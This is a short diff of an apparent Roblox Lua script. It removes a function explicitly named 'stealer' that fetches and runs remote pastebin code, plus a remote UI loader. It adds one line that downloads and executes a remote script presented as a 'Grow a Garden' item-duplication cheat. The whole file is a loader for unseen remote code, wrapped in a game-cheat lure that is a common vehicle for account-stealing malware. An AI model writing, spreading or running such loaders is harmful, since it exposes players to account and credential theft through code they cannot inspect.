@@ -1,10 +1,1 @@
-local function stealer()
-    loadstring(game:HttpGet("https://pastebin.com/raw/2MrdkW6b"))() -- replace with actual stealer
-end
-local function loadui()
-  loadstring(game:HttpGet("https://github.com/panumas13119/Dds/blob/main/ui"))()
-
-end
-
-task.spawn(stealer)
-task.spawn(loadui)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/panumas13119/Growagarden-dupe--newscript/refs/heads/main/gag-new-dupe"))()
